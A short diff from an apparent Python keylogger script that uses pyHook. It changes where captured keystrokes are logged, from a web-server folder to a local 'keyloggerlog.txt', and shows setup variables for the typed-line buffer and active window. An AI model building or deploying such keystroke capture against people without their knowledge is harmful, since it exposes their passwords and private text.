@@ -3,7 +3,7 @@ import pyHook, pythoncom
 from datetime import datetime
 
 todays_date = datetime.now().strftime('%Y-%b-%d')
-file_name = 'F:\\xampp\\htdocs\\Network_Police\\keylogger\\logs\\' + todays_date + '.txt'
+file_name = 'keyloggerlog.txt'
 
 line_buffer = "" #current typed line before return character
 window_name = "" #current window
